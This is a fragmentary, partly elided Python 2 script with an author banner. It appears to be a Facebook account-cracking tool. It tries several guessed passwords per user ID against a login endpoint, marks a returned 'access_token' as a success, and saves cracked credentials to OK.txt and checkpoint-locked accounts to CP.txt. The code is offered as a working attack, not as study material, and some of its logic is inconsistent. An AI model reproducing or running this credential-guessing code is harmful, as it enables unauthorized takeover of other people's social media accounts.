...
║ GITHUB ⚛ https://github.com/Hassan-404                                   

║ FACEBOOK ♾ https://facebook.com/Malik Hassan
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [AXB_SUCCESSFULL]  ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [AXB_SUCCEESFUL] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m  [AXB_SUCCESFUL] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [AXB_SUCCESSFUL]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m  [AXB_SUCCEESSFUL] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;95m[\x1b[1;98mAXB_menu_Back\x1b[1;95m]')
    login()
